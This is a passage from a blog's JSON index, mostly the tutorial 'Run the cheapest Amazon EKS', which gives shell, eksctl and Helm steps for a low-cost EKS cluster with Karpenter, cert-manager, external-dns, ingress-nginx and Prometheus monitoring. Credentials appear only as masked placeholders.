prometheus-kube-prometheus-stack-prometheus-0 609.9Mi 50.0Mi 50.0Mi __ __ │ └─ wiz-kubernetes-connector-broker-5d8fcfdb94-nq2lw 6.1Mi __ __ __ __ ├─ ip-192-168-16-172.ec2.internal (19%) 613.6Mi (46%) 1.5Gi (111%) 3.6Gi 3.2Gi 0.0 │ ├─ aws-node-4d64v 28.0Mi __ __ __ __ │ ├─ aws-node-termination-handler-v9jpw 12.0Mi __ __ __ __ │ ├─ cert-manager-7fb84796f4-mmp7g 30.7Mi __ __ __ __ │ ├─ cert-manager-cainjector-7f694c4c58-s5f4s 33.8Mi __ __ __ __ │ ├─ cert-manager-webhook-7cd8c769bb-5cr5d 11.5Mi __ __ __ __ │ ├─ coredns-79989457d9-9bz5s 15.6Mi 70.0Mi 170.0Mi __ __ │ ├─ coredns-79989457d9-pv2gz 15.0Mi 70.0Mi 170.0Mi __ __ │ ├─ ebs-csi-controller-fd8649d65-pllkv 56.1Mi 240.0Mi 1.5Gi __ __ │ ├─ ebs-csi-node-cffz8 19.3Mi 120.0Mi 768.0Mi __ __ │ ├─ karpenter-7b786469d4-s52fc 148.0Mi 1.0Gi 1.0Gi __ __ │ ├─ kube-prometheus-stack-grafana-b45c4f79-h67r8 221.9Mi __ __ __ __ │ ├─ kube-prometheus-stack-prometheus-node-exporter-gtgv7 9.3Mi __ __ __ __ │ └─ kube-proxy-zvnhr 12.2Mi __ __ __ __ └─ ip-192-168-84-230.ec2.internal (6%) 86.5Mi (10%) 136.0Mi (56%) 768.0Mi 1.3Gi 607.3Mi ├─ aws-node-4c49x 24.4Mi __ __ __ __ ├─ aws-node-termination-handler-dsd64 12.1Mi __ __ __ __ ├─ ebs-csi-node-s7b85 16.5Mi 120.0Mi 768.0Mi __ __ ├─ kube-prometheus-stack-prometheus-node-exporter-pd8qx 7.3Mi __ __ __ __ ├─ kube-proxy-2gblp 12.7Mi __ __ __ __ └─ podinfo-59d6468db-jmwxh 13.4Mi 16.0Mi __ __ __ pods __ (80%) 36.0 (80%) 36.0 45.0 9.0 ├─ ip-192-168-14-250.ec2.internal __ (100%) 17.0 (100%) 17.0 17.0 0.0 ├─ ip-192-168-16-172.ec2.internal __ (76%) 13.0 (76%) 13.0 17.0 4.0 └─ ip-192-168-84-230.ec2.internal __ (55%) 6.0 (55%) 6.0 11.0 5.0 Uninstall Podinfo: kubectl delete namespace podinfo || true Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{helm_values-podinfo,k8s-deployment-nginx}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "Run the cheapest Amazon EKS", "url": "/posts/cheapest-amazon-eks/", "categories": "Kubernetes, Cloud", "tags": "amazon-eks, kubernetes, karpenter, eksctl, cert-manager, external-dns", "date": "2022-11-27 00:00:00 +0100", "content": "Sometimes, it’s necessary to save costs and run Amazon EKS in the most cost-effective way. The following notes describe how to run Amazon EKS at the lowest possible price. Requirements: Utilize two Availability Zones (AZs), or use a single zone if feasible to reduce costs associated with cross-AZ traffic Use Spot instances Choose a less expensive AWS region, such as us-east-1 Employ the most price-efficient EC2 instance type, t4g.medium (2 CPUs, 4GB RAM), which uses AWS Graviton processors based on ARM architecture Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use a Network Load Balancer (NLB) as it is a cost-efficient and optimized load balancing solution Configure worker nodes to run the maximum number of pods possible using the max-pods-per-node setting https://stackoverflow.com/questions/57970896/pod-limit-on-node-aws-eks https://aws.amazon.com/blogs/containers/amazon-vpc-cni-increases-pods-per-node-limits/ Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you would like to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Verify that all necessary variables have been set: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the necessary tools: You can skip these steps if you have all the required software already installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation steps should only be done once. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Use your domain registrar to change the nameservers for your zone (e.g., mylabs.dev) to use the Amazon Route 53 nameservers. You can find the required Route 53 nameservers as follows: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Create the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This step depends on your domain registrar; I use Cloudflare and automate this with Ansible: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create Route53 Create a CloudFormation template that defines the Route53 zone. Add the new domain CLUSTER_FQDN to Route 53 and configure DNS delegation from the BASE_DOMAIN. Create the Route53 zone: tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live. Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN. (domain for all applications) Ex: k01.k8s.mylabs.dev\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation create-stack \\ --parameters \"ParameterKey=BaseDomain,ParameterValue=${BASE_DOMAIN} ParameterKey=ClusterFQDN,ParameterValue=${CLUSTER_FQDN}\" \\ --stack-name \"${CLUSTER_NAME}-route53\" \\ --template-body \"file://${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53.yml\" \\ --tags \"$(echo \"${TAGS}\" | sed -e 's/\\([^=]*\\)=\\([^,]*\\),*/Key=\\1,Value=\\2 /g')\" || true fi After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. Create the Amazon EKS cluster using eksctl: tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b iam: withOIDC: true serviceAccounts: - metadata: name: cert-manager namespace: cert-manager wellKnownPolicies: certManager: true roleName: eksctl-${CLUSTER_NAME}-irsa-cert-manager - metadata: name: external-dns namespace: external-dns wellKnownPolicies: externalDNS: true roleName: eksctl-${CLUSTER_NAME}-irsa-external-dns # Allow users which are consuming the AWS_ROLE_TO_ASSUME to access the EKS iamIdentityMappings: - arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/admin groups: - system:masters username: admin karpenter: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ version: v0.31.4 createServiceAccount: true withSpotInterruptionQueue: true addons: - name: vpc-cni # min version 1.14.0 version: latest configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" - name: kube-proxy - name: coredns - name: aws-ebs-csi-driver managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 disablePodIMDS: true volumeEncrypted: true # For instances with less than 30 vCPUs the maximum number is 110 and for all other instances the maximum number is 250 # https://docs.aws.amazon.com/eks/latest/userguide/cni-increase-ip-addresses.html maxPodsPerNode: 110 EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-provisioner.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: # Enables consolidation which attempts to reduce cluster cost by both removing # un-needed nodes and down-sizing those that can't be removed. # https://youtu.be/OB7IZolZk78?t=2629 consolidation: enabled: true requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] kubeletConfiguration: maxPods: 110 # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: resources: cpu: 8 memory: 32Gi providerRef: name: default # Labels are arbitrary key-values that are applied to all nodes labels: managedBy: karpenter provisioner: default --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: amiFamily: Bottlerocket subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true tags: KarpenerProvisionerName: \"default\" Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF aws-node-termination-handler The AWS Node Termination Handler gracefully handles EC2 instance shutdowns within Kubernetes. Install the aws-node-termination-handler Helm chart and modify its default values as shown below: # renovate: datasource=helm depName=aws-node-termination-handler registryUrl=https://aws.github.io/eks-charts AWS_NODE_TERMINATION_HANDLER_HELM_CHART_VERSION=\"0.21.0\" helm repo add --force-update eks https://aws.github.io/eks-charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-node-termination-handler.yml\" &lt;&lt; EOF awsRegion: ${AWS_DEFAULT_REGION} EOF helm upgrade --install --version \"${AWS_NODE_TERMINATION_HANDLER_HELM_CHART_VERSION}\" --namespace kube-system --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-node-termination-handler.yml\" aws-node-termination-handler eks/aws-node-termination-handler mailhog MailHog will be used to receive email alerts from Prometheus. Install the mailhog Helm chart and modify its default values: # renovate: datasource=helm depName=mailhog registryUrl=https://codecentric.github.io/helm-charts MAILHOG_HELM_CHART_VERSION=\"5.2.3\" helm repo add --force-update codecentric https://codecentric.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" &lt;&lt; EOF image: repository: docker.io/cd2team/mailhog tag: \"1663459324\" ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/sj26/mailcatcher/main/assets/images/logo_large.png forecastle.stakater.com/appName: Mailhog nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hosts: - host: mailhog.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - mailhog.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILHOG_HELM_CHART_VERSION}\" --namespace mailhog --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailhog.yml\" mailhog codecentric/mailhog kube-prometheus-stack The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It’s combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false alertmanager: config: global: smtp_smarthost: \"mailhog.mailhog.svc.cluster.local:1025\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email-notifications routes: - receiver: email-notifications matchers: [ '{severity=~\"warning|critical\"}' ] receivers: - name: email-notifications email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 33 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 11875-kubernetes-ingress-nginx-eks: # renovate: depName=\"Kubernetes Ingress Nginx - EKS\" gnetId: 11875 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 13473-portefaix-kubernetes-cluster-overview: # renovate: depName=\"Portefaix / Kubernetes cluster Overview\" gnetId: 13473 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 26 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 17 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailhog.mailhog.svc.cluster.local:1025\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: networkPolicy: enabled: true prometheus-node-exporter: networkPolicy: enabled: true prometheusOperator: tls: enabled: false admissionWebhooks: enabled: false networkPolicy: enabled: true prometheus: networkPolicy: enabled: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp2 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack karpenter Customize the karpenter default installation by upgrading its Helm chart and modifying the default values: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ KARPENTER_HELM_CHART_VERSION=\"v0.31.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF replicas: 1 serviceMonitor: enabled: true settings: aws: enablePodENI: true reservedENIs: \"1\" EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters. It also simplifies the process of obtaining, renewing, and using those certificates. The cert-manager service account was previously created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: create: false name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Add ClusterIssuers for the Let’s Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF external-dns ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns service account was previously created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: create: false name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns ingress-nginx ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.9.1\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: 